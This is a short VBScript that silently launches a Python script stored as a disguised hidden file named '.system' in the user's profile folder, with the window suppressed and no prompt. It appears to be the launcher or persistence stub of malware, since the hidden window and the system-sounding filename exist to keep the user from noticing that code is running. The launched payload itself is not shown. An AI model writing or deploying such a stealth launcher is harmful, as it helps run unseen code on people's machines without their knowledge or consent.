Set WshShell = CreateObject("WScript.Shell")
homeDir = WshShell.ExpandEnvironmentStrings("%USERPROFILE%")
pythonScriptPath = homeDir & "\.system"
WshShell.Run "python " & pythonScriptPath, 0, False
Set WshShell = Nothing